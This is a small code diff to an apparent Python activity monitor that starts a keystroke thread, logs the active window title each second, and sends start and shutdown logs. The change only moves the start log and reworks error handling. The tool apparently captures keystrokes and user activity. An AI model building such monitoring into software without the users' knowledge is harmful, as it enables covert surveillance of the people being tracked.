@@ -135,7 +135,6 @@ keystroke_thread.start()
 # Monitoring loop
 def monitor():
     global last_logged
-    log_system_start()
     try:
         while True:
             new_app_name, new_window_title = get_active_window_title()
@@ -146,8 +145,12 @@ def monitor():
                 last_logged = (new_app_name, new_window_title)
             time.sleep(1)
     except KeyboardInterrupt:
-        log_system_shutdown()
-        raise
+        pass
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+    finally:
+        log_system_shutdown()  # Ensure shutdown log is always sent
 
 if __name__ == "__main__":
+    log_system_start()  # Ensure this runs before monitoring starts
     monitor()
